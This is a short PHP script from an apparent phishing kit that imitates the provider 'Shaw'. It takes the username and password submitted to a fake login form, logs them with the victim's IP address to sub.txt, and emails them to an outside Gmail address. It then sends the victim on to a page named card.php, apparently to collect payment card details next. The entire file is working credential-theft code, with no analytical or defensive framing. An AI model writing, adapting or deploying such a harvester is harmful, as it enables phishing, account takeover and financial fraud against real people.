<?php
$required = array('password');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  echo '404';
} else {
session_start();

$ip = getenv("REMOTE_ADDR");

$msg = "

Email Address : ".$_POST['username']."
Password : ".$_POST['password']."
IP : $ip
==================================";

$send = "dosta@gmail.com";
$subj = "♥ Shaw Log ♥ - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail($send, $subj, $msg, $headers);


$fp=fopen('sub.txt','a'); 
fwrite($fp,addslashes($msg). "\r\n"); 
fclose($fp); 
header("Location: card.php");
exit();
}
?>